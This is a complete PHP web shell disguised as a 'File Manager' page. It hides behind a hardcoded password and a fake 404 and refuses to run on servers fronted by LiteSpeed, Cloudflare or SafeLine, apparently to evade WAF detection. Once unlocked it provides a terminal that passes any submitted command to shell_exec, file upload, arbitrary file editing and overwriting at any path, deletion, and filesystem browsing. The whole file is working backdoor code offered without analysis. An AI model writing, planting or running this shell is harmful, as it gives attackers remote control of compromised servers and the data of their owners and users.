<?php
@ini_set('display_errors', 0);
@error_reporting(0);

// === ANTI-LITESPEED PROTECTION ===
if (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
    http_response_code(403);
    exit("Forbidden: Access denied on LiteSpeed server");
}

// === ANTI-CLOUDFLARE WAF PROTECTION ===
if (isset($_SERVER['HTTP_CF_RAY']) || (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'cloudflare') !== false)) {
    http_response_code(403);
    exit("Forbidden: Access denied on Cloudflare-protected server");
}

// === ANTI-SAFELINE WAF PROTECTION ===
if (isset($_SERVER['HTTP_X_SAFELINE']) || (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'SafeLine') !== false)) {
    http_response_code(403);
    exit("Forbidden: Access denied on SafeLine-protected server");
}

$auth = 'aksesgw';

// === AUTH PROTECTION ===
if (!isset($_GET['auth']) || $_GET['auth'] !== $auth) {
    http_response_code(404);
    exit("Not Found");
}

session_start();

// === CURRENT DIRECTORY HANDLER ===
$cwd = isset($_GET['path']) && is_dir($_GET['path']) ? $_GET['path'] : getcwd();
@chdir($cwd);
$cwd = getcwd();

function h($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

// === UPLOAD ERROR MESSAGES ===
$upload_message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload']) && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $target_path = $cwd . '/' . basename($file['name']);

    // Check for upload errors
    if ($file['error'] !== UPLOAD_ERR_OK) {
        switch ($file['error']) {
            case UPLOAD_ERR_INI_SIZE:
            case UPLOAD_ERR_FORM_SIZE:
                $upload_message = "Error: File size exceeds server limits.";
                break;
            case UPLOAD_ERR_PARTIAL:
                $upload_message = "Error: File was only partially uploaded.";
                break;
            case UPLOAD_ERR_NO_FILE:
                $upload_message = "Error: No file was uploaded.";
                break;
            case UPLOAD_ERR_NO_TMP_DIR:
                $upload_message = "Error: Temporary folder missing.";
                break;
            case UPLOAD_ERR_CANT_WRITE:
                $upload_message = "Error: Failed to write file to disk.";
                break;
            case UPLOAD_ERR_EXTENSION:
                $upload_message = "Error: A PHP extension stopped the file upload.";
                break;
            default:
                $upload_message = "Error: Unknown upload error.";
                break;
        }
    } elseif ($file['size'] == 0) {
        $upload_message = "Error: Uploaded file is empty.";
    } elseif (!is_uploaded_file($file['tmp_name'])) {
        $upload_message = "Error: Invalid file upload attempt.";
    } elseif (@move_uploaded_file($file['tmp_name'], $target_path)) {
        $upload_message = "Success: File '" . h(basename($file['name'])) . "' uploaded successfully.";
    } else {
        $upload_message = "Error: Failed to move uploaded file. Check directory permissions.";
    }
}

// === HANDLE POST REQUEST ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Create Folder
    if (isset($_POST['mkdir']) && !empty($_POST['foldername'])) {
        @mkdir($cwd . '/' . basename($_POST['foldername']));
    }

    // Create File
    if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
        @file_put_contents($cwd . '/' . basename($_POST['filename']), '');
    }

    // Save File
    if (isset($_POST['savefile'], $_POST['filepath'], $_POST['filecontent'])) {
        @file_put_contents($_POST['filepath'], $_POST['filecontent']);
    }

    // Rename
    if (isset($_POST['rename'], $_POST['oldname'], $_POST['newname'])) {
        $old = $cwd . '/' . $_POST['oldname'];
        $new = $cwd . '/' . $_POST['newname'];
        if (file_exists($old)) {
            @rename($old, $new);
        }
    }

    // Run Command
    if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
        $_SESSION['last_cmd'] = shell_exec($_POST['cmd'] . " 2>&1");
    }

    header("Location: ?auth=$auth&path=" . urlencode($cwd));
    exit;
}

// === DELETE ===
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) {
        @rmdir($target);
    } elseif (is_file($target)) {
        @unlink($target);
    }
    header("Location: ?auth=$auth&path=" . urlencode($cwd));
    exit;
}

// === HTML START ===
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>File Manager</title>
<style>
body{font-family:sans-serif;background:#f4f4f4;padding:20px;}
h2{margin-top:0}
table{width:100%;border-collapse:collapse;background:#fff;}
td,th{border:1px solid #ccc;padding:8px;text-align:left}
form.inline{display:inline}
input[type=text]{padding:4px}
textarea{width:100%;height:300px}
.btn{padding:5px 10px;margin:3px;cursor:pointer}
pre{background:#000;color:#0f0;padding:10px;overflow:auto}
.breadcrumb {margin-bottom: 10px;}
.breadcrumb a {text-decoration: none; color: #007bff; margin-right: 5px;}
.breadcrumb a:hover {text-decoration: underline;}
.upload-message {margin: 10px 0; padding: 10px; border-radius: 5px;}
.upload-message.success {background: #dff0d8; color: #3c763d;}
.upload-message.error {background: #f2dede; color: #a94442;}
</style></head><body>";

echo "<h2>üìÅ Current Path: " . h($cwd) . "</h2>";

// === FOLDER NAVIGATION ===
echo "<div class='breadcrumb'>";
$path_parts = explode(DIRECTORY_SEPARATOR, $cwd);
$temp_path = '';
echo "<a href='?auth=$auth&path=" . urlencode(DIRECTORY_SEPARATOR) . "'>/</a>";
foreach ($path_parts as $part) {
    if (!empty($part)) {
        $temp_path .= DIRECTORY_SEPARATOR . $part;
        echo " / <a href='?auth=$auth&path=" . urlencode($temp_path) . "'>" . h($part) . "</a>";
    }
}
echo "</div>";

// === DISPLAY UPLOAD MESSAGE ===
if (!empty($upload_message)) {
    $message_class = strpos($upload_message, 'Success') === 0 ? 'success' : 'error';
    echo "<div class='upload-message $message_class'>" . h($upload_message) . "</div>";
}

// === TERMINAL ===
echo "<h3>üíª Terminal</h3>
<form method='POST'>
<input type='text' name='cmd' placeholder='Command...' style='width:80%'/>
<input type='submit' value='Run' class='btn' />
</form>";
if (isset($_SESSION['last_cmd'])) {
    echo "<pre>" . h($_SESSION['last_cmd']) . "</pre>";
}

// === UPLOAD & CREATE ===
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file' name='file' />
<input type='submit' name='upload' value='Upload' class='btn' />
</form>";

echo "<form method='POST'>
<input type='text' name='foldername' placeholder='New Folder' />
<input type='submit' name='mkdir' value='Create Folder' class='btn' />
</form>";

echo "<form method='POST'>
<input type='text' name='filename' placeholder='New File.txt' />
<input type='submit' name='newfile' value='Create File' class='btn' />
</form>";

// === LIST FILES ===
echo "<table><tr><th>Name</th><th>Size</th><th>Action</th></tr>";
foreach (@scandir($cwd) as $f) {
    if ($f === '.' || $f === '..') continue;

    $full = $cwd . '/' . $f;
    $is_dir = is_dir($full);
    $size = $is_dir ? '-' : filesize($full);

    echo "<tr>";
    echo "<td>" . ($is_dir ? "üìÅ " : "üìÑ ") .
         "<a href='?auth=$auth&path=" . urlencode(realpath($full)) . "'>" . h($f) . "</a></td>";
    echo "<td>$size</td><td>";

    // Delete
    echo "<form method='GET' class='inline'>
            <input type='hidden' name='auth' value='$auth'>
            <input type='hidden' name='delete' value='" . h($full) . "'>
            <input type='submit' value='üóëÔ∏è Delete' class='btn'>
          </form> ";

    // Edit
    if (!$is_dir) {
        echo "<form method='GET' class='inline'>
                <input type='hidden' name='auth' value='$auth'>
                <input type='hidden' name='edit' value='" . h($full) . "'>
                <input type='submit' value='‚úèÔ∏è Edit' class='btn'>
              </form> ";
    }

    // Rename
    echo "<form method='POST' class='inline'>
            <input type='hidden' name='oldname' value='" . h($f) . "' />
            <input type='text' name='newname' value='" . h($f) . "' />
            <input type='submit' name='rename' value='Rename' class='btn' />
          </form>";

    echo "</td></tr>";
}
echo "</table>";

// === EDIT FILE ===
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $editf = $_GET['edit'];
    echo "<h2>Edit: " . h($editf) . "</h2>
    <form method='POST'>
    <input type='hidden' name='filepath' value='" . h($editf) . "' />
    <textarea name='filecontent'>" . h(file_get_contents($editf)) . "</textarea><br/>
    <input type='submit' name='savefile' value='üíæ Save' class='btn' />
    </form>";
}

echo "</body></html>";
?>